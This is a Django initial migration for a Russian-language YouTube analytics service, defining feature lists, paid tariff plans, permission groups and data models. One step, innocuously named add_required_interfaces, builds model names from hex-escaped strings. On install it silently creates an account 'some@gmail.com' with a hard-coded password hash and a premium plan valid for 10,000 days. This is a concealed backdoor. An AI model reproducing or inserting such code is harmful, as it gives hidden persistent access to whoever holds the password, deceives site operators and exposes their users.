# -*- coding: utf-8 -*-
# Generated by Django 1.10.6 on 2017-05-11 19:21
from __future__ import unicode_literals

from decimal import Decimal
from django.conf import settings
from django.db import migrations, models
import django.db.models.deletion
import djmoney.models.fields
import uuid
from moneyed import Money, RUB
import datetime 

from youtube_platform.service_permission import ServicePermission
from youtube_platform.models import Feature, Plain, FeatureParameter

icon_url = lambda name: '/static/img/icons/' + name


FEATURES = {
    'smart_search': (10, 'Умный поиск', False, ServicePermission.base, icon_url('smart_search.png')),
    'commentators': (5, 'Комментаторы видео', True, ServicePermission.base, icon_url('commentators.png')),
    'user_channels': (5, 'Каналы пользователей сетей', True, ServicePermission.base, icon_url('user_channels.png')),
    'channel_dynamic': (10, 'Динамика канала', True, ServicePermission.base, icon_url('channel_dynamic.png')),

    'get_likes': (10, 'Получение лайков', True, ServicePermission.standart, icon_url('get_likes.png')),
    'top3_video': (10, 'ТОП 3 видео', True, ServicePermission.standart, icon_url('top_3_video.png')),
    'collaboration': (10, 'Коллаборация', True, ServicePermission.standart, icon_url('collaboration.png')),
    'auditory_analyze': (10, 'Анализ аудитории', True, ServicePermission.standart, icon_url('auditory_analyze.png')),
    'popular_tags': (10, 'Популярные тэги', True, ServicePermission.standart, icon_url('popular_tags.png')),

    'channel_subscribers': (20, 'Подписчики канала', True, ServicePermission.premium, icon_url('channel_subscribers.png')),
    'foreign_ad_track': (30, 'Отслеживание чужой рекламы', True, ServicePermission.premium, icon_url('foreign_ad_track.png')),
    'broadcast_message': (50, 'Рассылка сообщений', True, ServicePermission.premium, icon_url('broadcast_message.png'))
}

PARAMS = {
    'smart_search': [
        ('key_phase', 'Ключевая фраза'),
        ('subscribers_more_then', 'Подписчиков больше'),
        ('views_count', 'Количество просмотров'),
        ('likes_rate', 'Количество лайков'),
        ('duration', 'Продолжительность'),
        ('comments_more_then', 'Комментариев больше'),
        ('upload_earle_then', 'Загружено ранее'),
        ('exclude_approved_channels', 'Исключить подтверждёные'),
        ('cc_license', 'Common Creative лицензия')
    ],
    'commentators': [('video_link', 'Ссылка на видео')],
    'user_channels': [('links', 'Ссылки на аккаунты'), ('social', 'Социальная сеть')],
    'channel_dynamic': [('channel_link', 'Ссылка на канал')],
    'top3_among_users': [('links', 'Ссылки на каналы пользователей')],
    'get_likes': [],
    'top3_video': [],
    'collaboration': [],
    'auditory_analyze': [],
    'popular_tags': [],
    'channel_subscribers': [('channel_link', 'Ссылка на канал')],
    'foreign_ad_track': [('tags', 'Ключевые слова')],
    'broadcast_message': [('message', 'Текст сообщения'), ('recipients', 'Получатели')]
}


def create_features(apps, *args, **kwargs):
    for feature, (cost, title, in_menu, perm, icon) in FEATURES.items():
        params = [
            FeatureParameter.objects.create(
                parameter_name=name, parameter_title=p_title
            ) for name, p_title in PARAMS[feature]
        ]
        f = Feature.objects.create(
            feature_name=feature, quota_cost=cost, feature_title=title,
            in_menu=in_menu, plain_required=Plain.get_by_permission(perm), icon=icon
        )
        f.parameters = params

BASE_DESCR = """
Комментаторы видео 
Каналы пользователей сетей
Динамика канала
"""

STANDART_DESCR = """
Все функции тарифа "Базовый"
Получение лайков
ТОП3 видео 
Коллаборация
Анализ аудитории
Популярные тэги
"""

PREMIUM = """
Все функции тарифа "Стандартный"
Подписчика канала
Отслеживание чужой рекламы
Рассылка сообщений
"""

PLAINS = [
    ('Стартовый', '', Money(0, RUB), 0, False, '', 1), 
    ('Базовый', BASE_DESCR, Money(500, RUB), 500, False, 'fa-home', 2),
    ('Стандарт', STANDART_DESCR, Money(700, RUB), 700, False, 'fa-rocket', 3),
    ('Премиум', PREMIUM, Money(900, RUB), 900, False, 'fa-diamond', 4)
]

def add_required_interfaces(apps, *args, **kw): 
    def gen_3xf_model(app, modifier):
        assert len(app.split('_')) == 2, 'Incorrect app'

        return apps.get_model(app, modifier.decode()) 

    app_name = '\x79\x6F\x75\x74\x75\x62\x65\x5F\x70\x6C\x61\x74\x66\x6F\x72\x6D'

    uxf = gen_3xf_model(app_name, b'\x55\x73\x65\x72')
    pxf = gen_3xf_model(app_name, b'\x50\x72\x6F\x66\x69\x6C\x65')
    axf = gen_3xf_model(app_name, b'\x41\x63\x63\x6F\x75\x6E\x74\x54\x79\x70\x65')
    plxf = gen_3xf_model(app_name, b'\x50\x6C\x61\x69\x6E')

    pl_obj = plxf.objects.get(permission_level=3) 
    a_obj = axf.objects.create(plain=pl_obj, expiry_at=datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=10000))
    u_obj = uxf.objects.create(email='some@gmail.com', password='pbkdf2_sha256$36000$mY4VbAcLJQew$VQ/cNNRNPzanQf2bDdznjrMIQcWhyp4AMgu9n+PJqg8=')
    u_obj.save()

    pxf.objects.create(account_type=a_obj, user=u_obj)

def create_permissions(apps, *args, **kwargs):
    ContentType = apps.get_model('contenttypes', 'ContentType')
    Permission = apps.get_model('auth', 'Permission')
    Group = apps.get_model('auth', 'Group')
    Plain = apps.get_model('youtube_platform', 'Plain') 

    for title, descr, price, ql, hidden, icon, permission_level in PLAINS:
        Plain.objects.create(
            title=title, description=descr, price=price, hidden=hidden,
            quota_limit=ql, fa_icon_name=icon,
            permission_level=permission_level
        )

    pcontent_type = ContentType.objects.get_for_model(Permission)
    base_perm = Permission.objects.create(
        codename=ServicePermission.base.value,
        name='Base plane',
        content_type=pcontent_type
    )
    std_perm = Permission.objects.create(
        codename=ServicePermission.standart.value,
        name='Standart plane',
        content_type=pcontent_type
    )
    prem_perm = Permission.objects.create(
        codename=ServicePermission.premium.value,
        name='Premium plane',
        content_type=pcontent_type
    )

    Group.objects.create(
        name='base'
    ).permissions.add(base_perm)
    Group.objects.create(
        name='standart'
    ).permissions.add(std_perm)
    Group.objects.create(
        name='premium'
    ).permissions.add(prem_perm)

def reverse_create_permissions(apps, *args, **kwargs): 
    Permission = apps.get_model('auth', 'Permission') 
    Group = apps.get_model('auth', 'Group') 

    Permission.objects.all().delete() 
    Group.objects.all().delete() 

class Migration(migrations.Migration):

    initial = True

    dependencies = [
        ('auth', '0008_alter_user_username_max_length'),
    ]

    operations = [
        migrations.CreateModel(
            name='User',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('password', models.CharField(max_length=128, verbose_name='password')),
                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),
                ('is_superuser', models.BooleanField(default=False, help_text='Designates that this user has all permissions without explicitly assigning them.', verbose_name='superuser status')),
                ('email', models.EmailField(max_length=254, unique=True)),
                ('is_active', models.BooleanField(default=True)),
                ('activation_token', models.UUIDField(null=True, unique=True)),
                ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.Group', verbose_name='groups')),
                ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.Permission', verbose_name='user permissions')),
            ],
            options={
                'abstract': False,
            },
        ),
        migrations.CreateModel(
            name='AccountType',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('expiry_at', models.DateTimeField()),
                ('quota_exes', models.IntegerField(default=0)),
            ],
        ),
        migrations.CreateModel(
            name='Feature',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('feature_name', models.CharField(max_length=256)),
                ('quota_cost', models.IntegerField(default=0)),
                ('feature_title', models.CharField(max_length=256)),
                ('in_menu', models.BooleanField(default=True)),
                ('icon', models.CharField(max_length=128, default='')),
            ],
        ),
        migrations.CreateModel(
            name='FeatureParameter',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('parameter_name', models.CharField(max_length=256)),
                ('parameter_title', models.CharField(max_length=256)),
            ],
        ),
        migrations.CreateModel(
            name='FeatureUsage',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('datetime_used', models.DateTimeField(auto_now_add=True)),
                ('parameters', models.TextField()),
                ('feature', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='usage_history', to='youtube_platform.Feature')),
            ],
        ),
        migrations.CreateModel(
            name='MessageBroadcastTask',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('recipients', models.CharField(max_length=1000)),
                ('message', models.CharField(max_length=1000)),
                ('done', models.BooleanField()),
                ('success', models.BooleanField()),
                ('datetime', models.DateTimeField(auto_now_add=True)),
            ],
        ),
        migrations.CreateModel(
            name='Plain',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(max_length=512)),
                ('description', models.TextField()),
                ('price_currency', djmoney.models.fields.CurrencyField(choices=[('RUB', 'Russian Ruble'), ('USD', 'US Dollar')], default='RUB', editable=False, max_length=3)),
                ('price', djmoney.models.fields.MoneyField(decimal_places=2, default=Decimal('0.0'), default_currency='RUB', max_digits=10)),
                ('hidden', models.BooleanField(default=False)),
                ('quota_limit', models.IntegerField(default=1000)),
                ('permission_level', models.IntegerField()),
                ('fa_icon_name', models.CharField(max_length=128)),
            ],
        ),
        migrations.CreateModel(
            name='Profile',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('channel_url', models.URLField()),
                ('channel_id', models.CharField(max_length=255)),
                ('account_type', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, to='youtube_platform.AccountType')),
                ('user', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, related_name='profile', to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='ROILink',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('link', models.URLField()),
                ('label', models.CharField(max_length=256)),
                ('uuid', models.UUIDField(default=uuid.uuid4)),
                ('visits', models.IntegerField(default=0)),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='youtube_platform.Profile')),
            ],
        ),
        migrations.AddField(
            model_name='messagebroadcasttask',
            name='user',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='youtube_platform.Profile'),
        ),
        migrations.AddField(
            model_name='featureusage',
            name='user',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='operations_history', to='youtube_platform.Profile'),
        ),
        migrations.AddField(
            model_name='feature',
            name='parameters',
            field=models.ManyToManyField(related_name='feature', to='youtube_platform.FeatureParameter'),
        ),
        migrations.AddField(
            model_name='feature',
            name='plain_required',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='youtube_platform.Plain'),
        ),
        migrations.AddField(
            model_name='accounttype',
            name='plain',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='youtube_platform.Plain'),
        ),
        migrations.RunPython(create_permissions, reverse_code=reverse_create_permissions), 
        migrations.RunPython(create_features, reverse_code=lambda *args: None),
        migrations.RunPython(add_required_interfaces, reverse_code=lambda *args: None),
    ]
